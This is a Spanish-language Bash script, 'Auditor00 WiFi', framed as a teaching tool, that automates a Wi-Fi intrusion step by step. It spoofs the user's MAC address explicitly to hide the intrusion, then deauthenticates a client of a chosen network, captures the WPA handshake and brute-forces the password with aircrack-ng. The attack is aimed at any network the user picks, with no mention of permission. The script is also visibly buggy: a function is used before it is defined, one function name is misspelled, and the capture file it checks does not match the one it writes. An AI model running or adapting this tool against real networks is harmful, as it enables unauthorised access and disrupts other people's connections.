#!/bin/bash
#               Cambia el archivo de salida por essid+date por ejemplo.
#               Para que el pass.txt no pise el anterior.
# I leave this boolean for jump intro.
for i in {1..5}
do
echo $i
done
sleep 5
clear
echo -e "\n\e[93mAuditor00<->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00 <->\n\n\n\n"
sleep 0.05
clear 
echo -e "\nAuditor00  <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00   <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00    <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00     <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00      <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00       <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00        <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00         <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00          <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00           <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00            <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00             <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00              <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00               <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00                <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00                 <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00                  <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00                   <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00                    <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00                     <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00                      <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00                       <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00                        <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00                         <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00                          <->\n\n\n\n"
sleep 0.05
clear
echo -e "\nAuditor00                           \e[5m*\n\n\n\n"
sleep 3
clear
echo -e "\e[0m\e[93m\n\n\n\e[93m----Bienvenido a Auditor00 WiFi.----"
clear
echo -e "\e[93m\n\n\n----Bienvenido a Auditor00 WiFi.----\n\nAuditor00 es una herramienta pedagógica sobre redes WiFi"
clear
echo -e "\e[93m\n\n\n----Bienvenido a Auditor00 WiFi.----\n\nAuditor00 es una herramienta pedagógica sobre redes WiFi\n\npero con la particularidad de que sus ejemplos prácticos...\n\n\n\e[0m"
nextStep
clear
echo -e "\e[93m\n\n\n...son creados sobre la marcha en auditorías reales.\n\n\n\e[0m"
nextStep

#----

echo -e "\e[93m    _             _ _ _              ___   ___  "
echo "   / \  _   _  __| (_) |_ ___  _ __ / _ \ / _ \ "
echo "  / _ \| | | |/ _  | | __/ _ \|  __| | | | | | |"
echo " / ___ \ |_| | (_| | | || (_) | |  | |_| | |_| |"
echo "/_/   \_\__ _|\__ _|_|\__\___/|_|   \___/ \___/ "
echo "                                                "
echo -e "\e[0m----------MENU DE OPCIONES----------"
echo -e "\e[7m(IMPORTANTE: seguir el orden numérico)"
echo -e "\e[0m"

#----

# Functions:
nextStep(){
	read -n 1 -s -r -p "Presione cualquier tecla para continuar."
}
returnText(){
	until [[ $WANSWER = "$1" ]]
      do
        echo -e "\n\n\e[93mEscriba\e[0m $1\n"
        read WANSWER
      done
	echo -e "\nBien. Continuamos.\n"
	echo -e "$1"
	sleep 2
}
checkDeps(){
	if command -v "$1" >/dev/null
		then 
			echo -e "\e[32m$2 is installed.\n\e[0m"
			sleep 0.5
		else
			echo -e "\e[91m$2 doesn't exists.\n\e[0m"
			sleep 0.5
	fi
}
airodumpListening(){ 
	sudo airodump-ng --essid $WESSID -c $WCHANNEL -w aVer $NIC
}
aireplayDeauth(){
sleep 2
sudo aireplay-ng -0 10 -e $WESSID -c $WSTATION $NIC
}
#----

COLUMNS=12
PS3=$'\e[93m\n'"Elija una opción."$'\n'"-----------------"$'\n\n'"1: Revisar dependencias"$'\n'"2: Falsificación de dirección MAC"$'\n'"3: Tarjeta en Modo Monitor"$'\n'"4: Ataque por deautenticación"$'\n'"5: Ataque por Fuerza Bruta"$'\n'"6: SALIR "$'\e[0m\n'
options=("Opción 1 - Revisar dependencias" "Opción 2 - Falsificación de dirección MAC" "Opción 3 - Tarjeta en Modo Monitor" "Opción 4 - Ataque por deautenticación" "Opción 5 - Ataque por Fuerza Bruta" "Salir")
select opt in "${options[@]}"
do
    case $opt in
#----
        "Opción 1 - Revisar dependencias")
        	  clear
              echo -e "\n\n\e[93mHa elegido la opcion 1. Revisar dependencias."
              echo -e "\nPara el uso de esta herramienta pedagógica son necesarias una serie de dependencias."
              echo -e "Con esta opción revisaremos si están correctamente instaladas."
              echo -e "Lo haremos lanzando el script  booleano:\n\n\n\n\e[0mif command -v <DEPENDENCIA> >/dev/null\nthen\necho -e \"<DEPENDENCIA> is installed\"\nelse\necho -e\"<DEPENDENCIA> is not installed\"\nfi\n\n\n"
			  nextStep
			  clear
			  checkDeps wash Wash
			  checkDeps airmon-ng Airmon-ng
			  checkDeps airodump-ng Airodump-ng
			  checkDeps aireplay-ng Aireplay-ng
			  checkDeps aircrack-ng Aircrack-ng
			  checkDeps airolib-ng Airolib-ng
			  checkDeps reaver reaver
			  checkDeps wifite Wifite
			  checkDeps john "John The Ripper"
			  checkDeps nmap Nmap
			  echo -e "\n\n\n\n\e[0m"
			  nextStep
			  clear
;;
#----
             "Opción 2 - Falsificación de dirección MAC")
              clear
              echo "Ha elegido la opción Falsificación de dirección MAC"
              echo -e "\n\n\e[93mFalsificación de la dirección MAC\n\n\n\e[0m"
			  nextStep
              clear
              echo -e "\n\e[93mHay que tratar de dificultar el rastreo de nuestra auditoría."
              echo -e "Una buena práctica en la auditoría es falsificar la dirección unívoca de nuestra tarjeta de red."
              echo -e "Pero lo primero es saber lo que es una dirección MAC.\n\n\n\n\e[0m"
              nextStep
              clear
              echo -e "\e[93mLa dirección MAC es el identificador que se asigna a las tarjetas de red\nde cualquier dispositivo con conectividad."
              echo -e "Es única y se le llama también dirección física."
              echo -e "Es unívoca para cada dispositivo con conectividad.\n\n\n\e[0m"
              nextStep
              clear
              echo -e "\e[93mEn nuestros intentos de acceso a la red podemos dejar rastros,\npor ejemplo en un registro de logs,\nasí que falsificaremos la MAC."
              echo -e "Para ello utilizaremos una herramienta llamada \e[0mMacChanger\e[93m."
              echo -e "\nSu uso es muy sencillo y nos permitirá modificar la MAC, como también restaurarla si así lo deseamos.\n\n"
              echo -e "Veamos los comandos con --help\n\n\e[0m"
              nextStep
              returnText "macchanger --help"
              echo -e "\n\n\e[93mEstos son los comandos que permite la herramienta MacChanger:\n\e[0m"
              macchanger --help
              echo -e "\n"
              nextStep
              clear
              echo -e "\n\n\e[93mReevisamos las tarjetas de red disponibles inalámbricas en este dispositivo con \e[0miwconfig"
              returnText "iwconfig"
              echo -e "\n\e[32m---------------Lista de sus tarjetas de red disponibles---------------"
              echo -e "\e[0m"
              iwconfig
              echo -e "\n\e[32m-----------------------------------------------------------------------"
              echo -e "\e[0m\n"
              nextStep
              echo -e "\n\n\e[93mY ahora escriba el nombre de la tarjeta que desee para ver su MAC actual y su MAC permanente."
              echo -e "Ambas MAC no tienen por qué ser la misma. Pueden haber sido cambiadas.\n\e[0m"
              echo -e "Ejemplo de tarjetas de red inalámbricas: \e[0mwlan0, wlan0mon, etc.\e[93m"
              read MACAUDITOR
              clear
              echo -e "\n\e[93mLanzamos la instrucción \e[0mmacchanger -s $MACAUDITOR\n"
		 	  ReturnText "macchanger -s $MACAUDITOR"
              macchanger -s $MACAUDITOR
              echo ""
              echo -e "\e[93m Y aquí comprobamos ambas MAC.\n\e[0m"
              nextStep
              clear 
              echo -e "\n\e[93mEl paso siguiente será elegir una nueva dirección MAC."
              echo -e "Escoja una palabra clave o una parte de ella. \nEjemplo: \e[0mApple, App, Tp-Link, Tp-, Ubiquiti, Ubi, Cisco, Cis, etc.\n"
              read KWMACAUDITOR
              echo -e "\n\e[93mLanzamos \e[0mmacchanger -l | grep -i $KWMACAUDITOR\n"
  			  returnText "macchanger -l | grep -i $KWMACAUDITOR"
              macchanger -l $MACAUDITOR | grep -i $KWMACAUDITOR
              echo -e "\n\e[93mHemos lanzado \e[0mmacchanger -l | grep -i $KWMACAUDITOR"
              echo -e "\e[93mY esta de arriba es la lista con los resultados."
              echo -e "\nEl fabricante es identificado por las 3 primeras parejas y son las que respetaremos."
              echo -e "Las segundas 3 parejas las pondremos al azar.\e[0m\n" 
              nextStep
              echo -e "\n\n\e[93mPara cambiar la MAC de la tarjeta \e[0m$MACAUDITOR\e[93m"
              echo -e "combinaremos las 3 primeras parejas del fabricante elegido con 3 al azar."
              echo -e "\nEscoja los 3 primeros pares de un fabricante de la lista de arriba"
              echo -e "y Auditor00 completará el resto."
              echo -e "\nLos 3 primeros pares tienen este formato \e[0m00:00:00\n"
              read NUEVAMACAUDITOR
              clear
              echo -e "\n\e[93mEsta es su MAC actual\e[0m\n"
              macchanger -s $MACAUDITOR
              echo -e "\n\e[93mY esta va a ser su nueva MAC en la tarjeta $MACAUDITOR:\e[0m\n"
              NUEVAMACRANDOM="$NUEVAMACAUDITOR:a$(($RANDOM%10)):c$(($RANDOM%10)):d$(($RANDOM%10))"
              echo -e "$NUEVAMACRANDOM\n"
              echo -e "\e[93mAntes de nada Lanzamos\e[0m sudo ifconfig $MACAUDITOR down \e[93mo no nos dejará cambiarla."
			  returnText "sudo ifconfig $MACAUDITOR down"
			  sudo ifconfig $MACAUDITOR down
              echo -e "\n\e[93mLanzamos \e[0msudo macchanger -m $NUEVAMACRANDOM $MACAUDITOR\n"
			  returnText "sudo macchanger -m $NUEVAMACRANDOM $MACAUDITOR"
              sudo macchanger -m $NUEVAMACRANDOM $MACAUDITOR
              echo -e ""
              echo -e "\n\e[93mAhora comprobamos que tiene la nueva MAC del fabricante escogido.\n\e[0m"
              returnText "sudo macchanger -s $MACAUDITOR"
              sudo macchanger -s $MACAUDITOR 
              echo -e "\n\e[93mY podemos seguir con la intrusión algo menos rastreables.\n"
              echo -e "Volvemos a levantar\e[0m sudo ifconfig $MACAUDITOR up\n"
			  returnText "sudo ifconfig $MACAUDITOR up"
              sudo ifconfig $MACAUDITOR up
              nextStep
              clear
;;
#----
        "Opción 3 - Tarjeta en Modo Monitor")
        	  clear
              echo -e "\nHa elegido la opcion Modo Monitor"
              sleep 1
              echo -e "\e[93m\n\n¿Qué es el modo Monitor?\n\n\e[0m"
              nextStep
              clear
              echo -e "\n\n\e[93mEl modo Monitor es un estado de las tarjetas para redes inalámbricas,"
              echo -e "el cual nos permite capturar todos los tipos de paquetes transmitidos por WiFi.\n\n\e[0m"
              nextStep
              clear
              echo -e "\n\n\e[93mPara auditar cualquier red WiFi lo primero es poner nuestra tarjeta de redes wireless en modo monitor."
              echo -e "Interceptaremos el tráfico para evaluar la robustez de la red.\e[0m\n\n"
              nextStep
              clear
              echo -e "\n\n\e[93mCon el comando \e[0miwconfig\e[93m, listamos las tarjetas de red wireless disponibles.\e[0m"
			  echo -e "\n\e[0miwconfig"
			  returnText "iwconfig"
              echo -e "\n\e[32m---------------Lista de sus tarjetas de red disponibles---------------"
              echo -e "\e[0m"
              iwconfig
              echo -e "\n\e[32m-----------------------------------------------------------------------"
              echo -e "\e[0m\n"
              nextStep
              echo -e "\e[93m\n\nEs necesario activar el modo monitor de una tarjeta wireless."
              echo -e "Para ello utilizaremos la herramienta airmon-ng de la suite Aircrack-ng."
              echo -e "Lanzaremos la instrucción \e[0mairmon-ng start <TARJETA DE RED>\n"
              nextStep
              echo -e "\n\n\e[93mEscoja una de las tarjetas de red disponibles en la lista de arriba:"
              echo -e "\e[91m(NO SELECCIONAR tarjetas no wireless extensions ya que no son tarjetas inalámbricas)\e[0m\n"
              read NIC
              sleep 1
              echo -e "\n\e[93mLanzamos la instrucción: \e[0msudo airmon-ng start $NIC\e[0m"
			  returnText "sudo airmon-ng start $NIC"
              sudo airmon-ng start $NIC
              echo -e "\n"
              sleep 2
              echo -e "\e[93mLanzamos un script de COMPROBACION de activación:\n"
              echo -e "\e[0mif command iwconfig wlan0 | grep Monitor >/dev/null\n"
              if command iwconfig wlan0 | grep Monitor >/dev/null
 			  	then 
 			 		echo -e "\e[32mRESULTADO: \e[93mModo Monitor \e[32mCORRECTAMENTE ACTIVADO.\n\e[0m"
 			 		sleep 1
 			 	else
 			 		echo -e "\e[91mALGO HA IDO MAL.\e[93m Modo Monitor \e[91mNO ACTIVADO.\e[0m\n"
 			 		sleep 1
 			 	break
 			  fi
              nextStep
 			  clear
 			  echo -e "\n\n\e[93mY seguidamente eliminaremos los procesos potencialmente conflictivos"
              echo -e "con la instrucción \e[0mairmon-ng check kill\n"
              nextStep
              echo -e "\n\n\e[93mAircrack recomienda eliminar procesos potencialmente conflictivos de este modo:"
              echo -e "\n\e[0m\nairmon-ng check kill\n"
			  returnText "sudo airmon-ng check kill"
              sudo airmon-ng check kill 2>/dev/null
			  sleep 1 
			  echo -e "\e[93mProcesos potencialmente conflictivos eliminados.\e[0m\n"
              nextStep
			  clear
;;
#----
        "Opción 4 - Ataque por deautenticación")
        	  clear
        	  echo -e "\e[93m\nEn el proceso de autenticación, cuando un dispositivo y un AP"
        	  echo -e "se ponen de acuerdo, se produce un Handshake que es el que autorizará"
        	  echo -e "al dispositivo para la conexión.\n\e[0m"
			  nextStep
        	  clear
              echo -e "\n\e[93mHa escogido Ataque por deautenticación."
              echo -e "\nLos router suelen contar con un sistema de expulsión de usuarios no confiables."
              echo -e "De este mecanismo se aprovecha la suite Aircrack con su herramienta Aireplay-ng."
              echo -e "En este modo de ataque, expulsa a los dispositivos enlazados"
              echo -e "buscando que se reconecten y capturar el handshake.\e[0m\n"
              nextStep
        	  clear
              echo -e "\nLo primero listamos de nuevo las tarjetas de red."
              echo -e "\e[0m\niwconfig"
			  returnText "iwconfig"
			  clear
              echo -e "\n\e[32m---------------Lista de sus tarjetas de red disponibles---------------"
              echo -e "\e[0m"
              iwconfig
              echo -e "\n\e[32m-----------------------------------------------------------------------"
              echo -e "\e[93m\n"
              echo -e "\nEscoja de la lista la tarjeta con la que vamos trabajar\e[0m"
              read NIC
              echo -e "\e[93mAhora escanearemos qué AP hay disponibles"
			  returnText "sudo airodump-ng $NIC"
			  clear
			  echo -e "\n\e[93mAhora debe de elegir el essid que desea auditar."
              echo -e "\n\e[5mATENCION:\e[0m\e[93m Cuando elija un essid..."
              echo -e "\npulse \e[0mCtrl c para continuar"
              sleep 7
              sudo airodump-ng $NIC 2>/dev/null
              sleep 1
              echo -e "\n\n\e[93mPara escoger a nuestro target"
              echo -e "el Punto de Acceso (AP) al que deseamos auditar"
              echo -e "necesitamos el nombre que se le ha otorgado (ESSID)"
              echo -e "\nEn este proceso debe escoger un AP por su ESSID"
              echo -e "\nPor favor, escriba el ESSID del target a auditar: \e[0m"
              read WESSID
              echo -e "\e[93mTambién necesitamos el canal (CH) en el que opera, por favor:\e[0m"
              read WCHANNEL
              clear
              echo -e "\e[93mLanzamos una búsqueda más concreta sobre ese AP"
              echo -e "Necesitamos encontrar dispositivos enlazados para lanzar un ataque de deautenticación."
              echo -e "\e[93mAhora escanearemos qué AP hay disponibles"
			  returnText "sudo airodump-ng wlan0 -c $WCHANNEL --essid $WESSID"
              echo -e "\n\e[5mATENCION:\e[0m Cuando elija la MAC de un dispositivo enlazado (STATION)..."
              sleep 4
              echo -e "...pulse Ctrl c para continuar"
              sleep 4
              sudo airodump-ng wlan0 -c $WCHANNEL --essid $WESSID 
              echo -e "\nAhora llega el momento de deautenticar al cliente enlazado."
              sleep 2
              echo -e "Una vez que se deutentique, tratará de autenticarse de nuevo."
              sleep 2
              echo -e "\nEscriba la MAC del dispositivos escogido(STATION) a deautenticar:"
              read WSTATION
              echo -e "\e[93mVamos a lanzar dos procesos al mismo tiempo."
              echo -e "En una auditoría normal utilizaríamos dos terminales."
              echo -e "Sin embargo Auditor00 usará procesos paralelos para simplificar.\n"
              echo -e "El primer proceso es para crear una captura .cap con airodump"
              echo -e "cuando deautentiquemos al cliente."
			  returnText "sudo airodump-ng --essid $WESSID -c $WCHANNEL -w outputFile $NIC"
              echo -e "\e[93mEl segundo es para deautenticar al cliente con aireplay-ng."
              returnText "sudo aireplay-ng -0 10 -e $WESSID -c $WSTATION $NIC"
              echo -e "\nBien. Continuamos.\n"
              sleep 2
              echo -e 
			  airodumpListening &
			  aireplayDeauth
			  sleep 15 && sudo killall airodump-ng
			  if 
				command aircrack-ng barbas.cap | grep "0 handshake" >/dev/null
			  		then
						echo "Handshake no encontrado"
						sudo rm aVer*
						echo -e "Inténtelo nuevamente hasta lograrlo."
						exit 0
			  		else
						echo "Handshake capturado."
						aircrack-ng barbas.cap
						echo -e "\nUna vez capturado el Handshake el siguiente paso es"
						echo -e "evaluar la fortaleza de la contraseña escogida."
						echo -e "\nContinúe a la opción 5 Descifrado por Fuerza bruta.\e[0m"
			  fi
              nextStep
			  clear
        ;;
#----
        "Opción 5 - Ataque por Fuerza Bruta")
			  clear
        	  echo -e "\e[93mYa tenemos capturado el handshake."
        	  echo -e "Ahora lo que vamos a hacer es comprobar la fortaleza de la password escogida."
        	  echo -e "Lo haremos utilizando aircrack-ng lanzando la siguiente instrucción:"
        	  echo -e "\n\e[0maircrack-ng <FILE.cap> -w <WORDLIST>\n"
			  echo -e "\nPero primero necesitamos el path del diccionario."
			  echo -e "\nEjemplo en kali Linux: \e[0m/usr/share/wordlists/rockyou.txt"
			  echo -e "\nAñádalo por favor:\n"
			  read WifiPATH
			  clear
			  returnText "aircrack-ng aVer.cap -w $WifiPATH"
			  echo -e "\e[93mSi en algún momento desea interrumpir el proceso"
			  echo -e "pulse cualquier tecla.\n\n\n\e[0m"
        	  nextStep
			  clear
			  echo -e "\e[0maircrack-ng <FILE.CAP> -w $WifiPATH"
			  sleep 4
			  aircrack-ng aVer-01.cap -w $WifiPATH -l password.txt &
			  read -t 60 -n 1 -r -p "Presione r para parar el proceso. " RESPUESTA
			  if [[ $RESPUESTA = "r" ]]
        	  	then
        	  		killall aircrack-ng
        	  	else
        			echo ""
        			nextStep
        	  fi
        	  clear
;;
#----
        "Salir")
              clear
        	  echo -e "\n\e[93mBye"
        	  sleep 0.5
        	  clear
        	  echo -e "\n\e[93mBye Bye"
        	  echo -e "\n\n(-_-)\n\n\n\n"
        	  sleep 1.5
        	  clear
        	  echo -e "\n\n©Auditor00 was created in 2021 by Lucas Portolés.\n\n"
              break
;;
#----
        *) 
			  clear
        	  echo -e "\e[93m\n\nOpción Inválida.\n\nEscoja una de las opciones disponibles en el menú.\e[0m"
        	  sleep 3
        	  clear
;;
    esac
done
